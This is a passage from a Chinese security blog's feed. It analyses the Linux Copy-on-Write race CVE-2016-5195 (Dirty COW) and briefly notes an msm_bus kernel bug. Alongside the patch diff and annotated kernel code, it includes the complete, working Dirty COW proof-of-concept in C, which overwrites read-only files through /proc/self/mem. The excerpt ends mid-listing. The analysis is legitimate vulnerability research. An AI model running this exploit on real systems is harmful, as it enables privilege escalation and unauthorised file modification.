    <![CDATA[<p>Illegal access caused by an empty list. This problem is not repaired, I only test it in Nexus4 and Nexus5 with the security patch level 20161005. It will cause kernel panic.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ssize_t  <span class="title">msm_bus_dbg_update_request_write</span><span class="params">(<span class="keyword">struct</span> file *file,</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> __user *ubuf, size_t cnt, loff_t *ppos)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">	list_for_each_entry(cldata, &amp;cl_list, <span class="built_in">list</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strstr</span>(chid, cldata-&gt;pdata-&gt;name)) &#123;</span><br><span class="line">			cldata = cldata;</span><br><span class="line">			strsep(&amp;chid, <span class="string">" "</span>);</span><br><span class="line">			<span class="keyword">if</span> (chid) &#123;</span><br><span class="line">				ret = strict_strtoul(chid, <span class="number">10</span>, &amp;index);</span><br><span class="line">				<span class="keyword">if</span> (ret) &#123;</span><br><span class="line">					MSM_BUS_DBG(<span class="string">"Index conversion"</span></span><br><span class="line">						<span class="string">" failed\n"</span>);</span><br><span class="line">					<span class="keyword">return</span> -EFAULT;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span></span><br><span class="line">				MSM_BUS_DBG(<span class="string">"Error parsing input. Index not"</span></span><br><span class="line">					<span class="string">" found\n"</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	msm_bus_dbg_update_request(cldata, index);</span><br><span class="line">	kfree(buf);</span><br><span class="line">	<span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]>
    
    </summary>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-5195]]></title>
    <link href="http://blog.idhyt.com/2016/10/24/exploit-cve-2016-5195/"/>
    <id>http://blog.idhyt.com/2016/10/24/exploit-cve-2016-5195/</id>
    <published>2016-10-24T15:24:11.000Z</published>
    <updated>2016-11-10T05:23:28.000Z</updated>
    <content type="html"><![CDATA[<p>你们这些人啊，每年年底都想搞个大新闻。。。</p>
<p>Linux内核 &gt;= 2.6.22（2007年发行）以后的版本都受到影响，同时影响到android系统。</p>
<p>Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞。</p>
<a id="more"></a>
<p>这个洞涉及到的东西比较多，包括了缺页中断处理，写时拷贝(Copy-on-Write,COW)，竞态条件，页式内存管理等，要看的东西还很多。</p>
<p>针对android做一个简单的流程分析。</p>
<h2 id="补丁">补丁</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+static inline bool can_follow_write_pte(pte_t pte, unsigned int flags)</span><br><span class="line">+&#123;</span><br><span class="line">+ return pte_write(pte) ||</span><br><span class="line">+   ((flags &amp; FOLL_FORCE) &amp;&amp; (flags &amp; FOLL_COW) &amp;&amp; pte_dirty(pte));</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> static struct page *follow_page_pte(struct vm_area_struct *vma,</span><br><span class="line">    unsigned long address, pmd_t *pmd, unsigned int flags)</span><br><span class="line"> &#123;</span><br><span class="line">@@ -95,7 +105,7 @@ retry:</span><br><span class="line">  &#125;</span><br><span class="line">  if ((flags &amp; FOLL_NUMA) &amp;&amp; pte_protnone(pte))</span><br><span class="line">    goto no_page;</span><br><span class="line">- if ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;</span><br><span class="line">+ if ((flags &amp; FOLL_WRITE) &amp;&amp; !can_follow_write_pte(pte, flags)) &#123;</span><br><span class="line">    pte_unmap_unlock(ptep, ptl);</span><br><span class="line">    return NULL;</span><br><span class="line">  &#125;</span><br><span class="line">@@ -412,7 +422,7 @@ static int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,</span><br><span class="line">   * reCOWed by userspace write).</span><br><span class="line">  if ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">-   *flags &amp;= ~FOLL_WRITE;</span><br><span class="line">+         *flags |= FOLL_COW;</span><br><span class="line">  return 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>补丁函数follow_page_pte，对应android中函数为<code>follow_page</code>，<br>通过引用找到该函数的调用来源：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">follow_page &lt;- </span><br><span class="line">__get_user_pages &lt;- </span><br><span class="line">get_user_pages &lt;- </span><br><span class="line">__access_remote_vm &lt;- </span><br><span class="line">access_remote_vm &lt;- </span><br><span class="line">mem_rw &lt;- </span><br><span class="line">mem_write &lt;- </span><br><span class="line">proc_mem_operations</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">struct</span> file_operations proc_mem_operations = &#123;</span><br><span class="line">    .llseek     = mem_lseek,</span><br><span class="line">    .read       = mem_read,</span><br><span class="line">    .write      = mem_write,</span><br><span class="line">    .open       = mem_open,</span><br><span class="line">    .release    = mem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>该结构位于<code>fs/proc/base.c</code>中，为<code>/proc/&lt;pid&gt;/mem</code>读写等操作的ops。</p>
<h2 id="POC">POC</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="keyword">struct</span> stat st;</span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str;</span><br><span class="line">    str = (<span class="keyword">char</span>*) arg;</span><br><span class="line">    <span class="keyword">int</span> i, c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100000000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        c += madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"madvise %d\n\n"</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str;</span><br><span class="line">    str = (<span class="keyword">char</span>*)arg;</span><br><span class="line">    <span class="keyword">int</span> f = open(<span class="string">"/proc/self/mem"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> i, c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100000000</span>; i++) &#123;</span><br><span class="line">        lseek(f, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        c += write(f, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"procselfmem %d\n\n"</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line"></span><br><span class="line">    f = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">    fstat(f, &amp;st);</span><br><span class="line">    name = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, st.st_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmap %p\n\n"</span>, <span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, argv[<span class="number">1</span>]);</span><br><span class="line">    pthread_create(&amp;pth2, <span class="literal">NULL</span>, procselfmemThread, argv[<span class="number">2</span>]);</span><br><span class="line">    pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>线程2(procselfmemThread)：<br>线程循环调用write向mmap的文件数据进行写操作，由于mmap的映射文件flag为<code>MAP_PRIVATE</code>，所以写入操作会产生一个映射区的复制(copy-on-write)，从而保证对此区域所有的修改不会写回原文件。<br>结合前边的漏洞触发逻辑，该线程通过某种方式触发了漏洞，使得写入操作直接影响了原始数据。</p>
<p>线程1(madviseThread)：<br>循环调用madvise函数，<code>madvice(caddr_t addr, size_t len, int advice)</code>，该函数说明如下（引自网络）：<br>这个函数的主要用处是告诉内核内存addr～addr+len在接下来的使用状况，以便内核进行一些进一步的内存管理操作。当advice为MADV_DONTNEED时，此系统调用相当于通知内核addr～addr+len的内存在接下来不再使用，内核将释放掉这一块内存以节省空间，相应的页表项也会被置空。</p>
<h2 id="漏洞逻辑">漏洞逻辑</h2><h3 id="write">write</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ssize_t <span class="title">mem_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,</span><br><span class="line">             size_t count, loff_t *ppos)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mem_rw(file, (<span class="keyword">char</span> __user*)buf, count, ppos, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> ssize_t <span class="title">mem_rw</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">char</span> __user *buf,</span><br><span class="line">            size_t count, loff_t *ppos, <span class="keyword">int</span> write)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    this_len = access_remote_vm(mm, addr, page, this_len, write);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">access_remote_vm</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span><br><span class="line">        <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> write)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> __access_remote_vm(<span class="literal">NULL</span>, mm, addr, buf, len, write);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __access_remote_vm(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> mm_struct *mm,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> write)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    ret = get_user_pages(tsk, mm, addr, <span class="number">1</span>, write, <span class="number">1</span>, &amp;page, &amp;vma);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (write) &#123;    <span class="comment">// write = 1</span></span><br><span class="line">        copy_to_user_page(vma, page, addr, maddr + offset, buf, bytes); <span class="comment">// memcpy拷贝数据</span></span><br><span class="line">        set_page_dirty_lock(page);    <span class="comment">// Dirty a page, CPU在写操作的时候,会置位PTE_DIRTY,说明对应的页被写过,是脏的.</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        copy_from_user_page(vma, page, addr,</span><br><span class="line">                    buf, maddr + offset, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_user_pages</span><span class="params">(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> mm_struct *mm,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">int</span> nr_pages, <span class="keyword">int</span> write, <span class="keyword">int</span> force,</span><br><span class="line">        <span class="keyword">struct</span> page **pages, <span class="keyword">struct</span> vm_area_struct **vmas)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flags = FOLL_TOUCH;</span><br><span class="line">    <span class="keyword">if</span> (pages)</span><br><span class="line">        flags |= FOLL_GET;</span><br><span class="line">    <span class="keyword">if</span> (write)              <span class="comment">// write = 1</span></span><br><span class="line">        flags |= FOLL_WRITE;</span><br><span class="line">    <span class="keyword">if</span> (force)</span><br><span class="line">        flags |= FOLL_FORCE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> __get_user_pages(tsk, mm, start, nr_pages, flags, pages, vmas,</span><br><span class="line">                <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> * __get_user_pages() - pin user pages in memory</span><br><span class="line"> * ...</span><br><span class="line"> * __get_user_pages walks a process's page tables and takes a reference to</span><br><span class="line"> * each struct page that each user address corresponds to at a given</span><br><span class="line"> * instant. That is, it takes the page that would be accessed if a user</span><br><span class="line"> * thread accesses the given user virtual address at that instant.</span><br><span class="line"> *</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">int</span> __get_user_pages(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> mm_struct *mm,</span><br><span class="line">             <span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">int</span> nr_pages, <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags,</span><br><span class="line">             <span class="keyword">struct</span> page **pages, <span class="keyword">struct</span> vm_area_struct **vmas,</span><br><span class="line">             <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// vm_flags = (VM_WRITE | VM_MAYWRITE)</span></span><br><span class="line">    vm_flags = (gup_flags &amp; FOLL_WRITE) ?</span><br><span class="line">            (VM_WRITE | VM_MAYWRITE) : (VM_READ | VM_MAYREAD);</span><br><span class="line">    <span class="comment">// vm_flags = VM_WRITE</span></span><br><span class="line">    vm_flags &amp;= (gup_flags &amp; FOLL_FORCE) ?</span><br><span class="line">            (VM_MAYREAD | VM_MAYWRITE) : (VM_READ | VM_WRITE);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">while</span> (!(page = follow_page(vma, start, foll_flags))) &#123;  <span class="comment">// 获取页表项</span></span><br><span class="line">                <span class="keyword">int</span> ret;</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">int</span> fault_flags = <span class="number">0</span>;</span><br><span class="line">                ...</span><br><span class="line">                <span class="comment">// 3. pass</span></span><br><span class="line">                <span class="keyword">if</span> (foll_flags &amp; FOLL_WRITE)</span><br><span class="line">                    fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line">                ...</span><br><span class="line">                ret = handle_mm_fault(mm, vma, start, fault_flags); <span class="comment">// 获取失败时会调用这个函数</span></span><br><span class="line">                ...</span><br><span class="line">                <span class="comment">// 如果是因为映射没有写权限导致的获取页表项失败，去掉flags中的FOLL_WRITE标记，从而使的获取页表项不再要求内存映射具有写的权限。</span></span><br><span class="line">                <span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">                        foll_flags &amp;= ~FOLL_WRITE;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个while循环将是触发漏洞的逻辑。</p>
<h3 id="follow_page">follow_page</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line"> * follow_page - look up a page descriptor from a user-virtual address</span><br><span class="line"> * Returns the mapped (struct page *), %NULL if no mapping exists, or</span><br><span class="line"> * an error pointer if there is a mapping to something not represented</span><br><span class="line"> * by a page descriptor (see also vm_normal_page()).</span><br><span class="line"> *</span><br><span class="line"> * 根据虚拟地址获取内核内存页, 如果没有映射的内核内存页时，返回NULL</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">struct</span> page *<span class="title">follow_page</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    ... </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里判断页表项是否有效。</span></span><br><span class="line">    <span class="comment">// 当页完全不在内存中时，页表项也没有效。</span></span><br><span class="line">    <span class="keyword">if</span> (!pte_present(pte))      <span class="comment">// 1. 3.</span></span><br><span class="line">            <span class="keyword">goto</span> no_page;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 希望搜索一个可写的页面，但是页表项没有写权限。</span></span><br><span class="line">    <span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte))    <span class="comment">// 2.</span></span><br><span class="line">            <span class="keyword">goto</span> unlock;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据pte中保存的页帧号，找到该页帧号对应的page结构。</span></span><br><span class="line">    page = vm_normal_page(vma, address, pte);   <span class="comment">// 4.</span></span><br><span class="line">    ...</span><br><span class="line">unlock:</span><br><span class="line">    pte_unmap_unlock(ptep, ptl);</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">    ...</span><br><span class="line">no_page:</span><br><span class="line">    pte_unmap_unlock(ptep, ptl);</span><br><span class="line">    <span class="keyword">if</span> (!pte_none(pte))</span><br><span class="line">        <span class="keyword">return</span> page;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="handle_mm_fault">handle_mm_fault</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span 